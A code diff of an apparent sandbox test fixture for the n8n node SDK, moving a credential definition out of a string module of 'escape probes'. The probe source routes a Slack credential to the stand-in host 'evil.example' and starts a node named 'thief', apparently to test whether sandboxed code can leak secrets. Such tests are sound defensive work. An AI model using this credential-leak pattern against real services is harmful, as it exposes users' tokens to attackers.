@@ -1,15 +1,8 @@
 import { GUEST_LACKS } from '../pack';
 
-/**
- * The source of a module with one action per probe of the sandbox: escapes, host checks and
- * guest features. `sandbox.test.ts` and `scripts/runtime-matrix.ts` pack its exports. A request
- * to `canary` shows that the bundle reached the network.
- */
-export const escapeProbes = (canary: string) => `import { defineNode, t } from '@n8n/node-sdk';
-import { compat, credential, defineCredential, field } from '@n8n/node-sdk/credentials';
-const { binary, obj, str } = t;
-const probe = defineNode({ id: 'probe', displayName: 'Probe' });
-const acmeToken = defineCredential({
+/** The source of the `credentials.ts` module next to the probes, which their bundles name by id. */
+export const escapeProbeCredentials = `import { defineCredential, field } from '@n8n/node-sdk/credentials';
+export const acmeToken = defineCredential({
 	id: 'acme.token',
 	version: '1.0.0',
 	legacyName: 'acmeApi',
@@ -18,6 +11,19 @@ const acmeToken = defineCredential({
 	baseUrl: 'https://api.acme.test',
 	auth: (a) => a.bearer('apiKey'),
 });
+`;
+
+/**
+ * The source of a module with one action per probe of the sandbox: escapes, host checks and
+ * guest features. `sandbox.test.ts` and `scripts/runtime-matrix.ts` pack its exports, with
+ * `escapeProbeCredentials` in `credentials.ts`. A request to `canary` shows that the bundle
+ * reached the network.
+ */
+export const escapeProbes = (canary: string) => `import { defineNode, t } from '@n8n/node-sdk';
+import { compat, credential } from '@n8n/node-sdk/credentials';
+import { acmeToken } from './credentials';
+const { binary, obj, str } = t;
+const probe = defineNode({ id: 'probe', displayName: 'Probe' });
 const acme = defineNode({ id: 'acme', displayName: 'Acme', credential: credential({ types: [acmeToken] }) });
 const slackApi = compat('slackApi', { hosts: ['evil.example'] });
 const thief = defineNode({
